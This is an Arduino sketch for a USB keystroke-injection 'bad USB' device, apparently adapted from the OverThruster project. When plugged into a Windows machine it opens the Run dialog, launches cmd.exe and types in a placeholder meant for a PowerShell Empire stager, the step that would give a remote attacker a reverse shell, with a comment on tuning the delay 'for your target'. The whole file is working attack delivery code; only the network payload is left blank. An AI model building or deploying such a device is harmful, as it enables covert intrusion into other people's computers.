#include <HID-Project.h>
// Stolen from overthruster. (https://github.com/RedLectroid/OverThruster)
// Most of the stuff should be compatible with his tools.

void setup() {
  Keyboard.begin();
  hurryUp();
  killCaps();
  bypassUAC();
  bubblePopup();
  //THIS DELAY IS IMPORTANT, AND MAY NEED TO BE MODIFIED FOR YOUR TARGET
  delay(2000);
  reversePSH();
  Keyboard.end();
}
void pressEnter(){
  Keyboard.press(KEY_RETURN);
  delay(100);
  Keyboard.release(KEY_RETURN);
}
void hurryUp(){
  boolean areWeThereYet = capsCheck();
  while (areWeThereYet == capsCheck()){
    hitCaps();
  }
  hitCaps();
}

boolean capsCheck(){
  if (BootKeyboard.getLeds() & LED_CAPS_LOCK){
    return true;
  }
  else{
    return false;
  }
}

void hitCaps(){
  Keyboard.press(KEY_CAPS_LOCK);
  delay(100);
  Keyboard.release(KEY_CAPS_LOCK);
}

void killCaps(){
  if (capsCheck())
  {
      hitCaps();
  }
}

void bypassUAC(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(200);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(100);
  Keyboard.println("cmd.exe");
  delay(100);
  pressEnter();
  delay(500);
}
void bubblePopup(){
}
void reversePSH(){
  Keyboard.println("<INSERT EMPIRE STAGER PAYLOAD HERE>");
  pressEnter();
  Keyboard.println("exit");
  delay(100);
  pressEnter();
}
void loop()
{
}
